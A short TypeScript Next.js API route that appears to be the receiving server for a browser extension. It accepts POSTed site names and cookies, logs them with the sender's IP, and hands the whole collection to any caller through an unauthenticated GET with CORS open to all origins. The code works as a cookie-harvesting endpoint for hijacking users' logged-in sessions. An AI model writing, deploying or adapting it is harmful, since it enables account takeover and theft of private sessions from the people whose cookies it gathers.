import type { NextApiRequest, NextApiResponse } from 'next';
import nextjsCors from 'nextjs-cors';

interface Cookie {
  name: string;
  value: string;
}

interface Session {
  siteName: string;
  cookies: Cookie[];
  ip: string;
}

let sessionData: Session[] = [];

export default async function handler(req: NextApiRequest, res: NextApiResponse) {
  // Handling CORS
  await nextjsCors(req, res, {
    methods: ['GET', 'POST'],
    origin: '*', // Adjust this to match your extension's origin for security
    optionsSuccessStatus: 200,
  });

  if (req.method === 'POST') {
    const ipAddress = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    const newSession: Session = {
      siteName: req.body.siteName,
      cookies: req.body.cookies,
      ip: ipAddress as string,
    };
    sessionData.push(newSession);
    res.status(200).json({ message: 'Cookies received' });
  } else if (req.method === 'GET') {
    res.status(200).json(sessionData);
  } else {

    res.setHeader('Allow', ['GET', 'POST']);
    res.status(405).end(`Method ${req.method} Not Allowed`);
  }
}
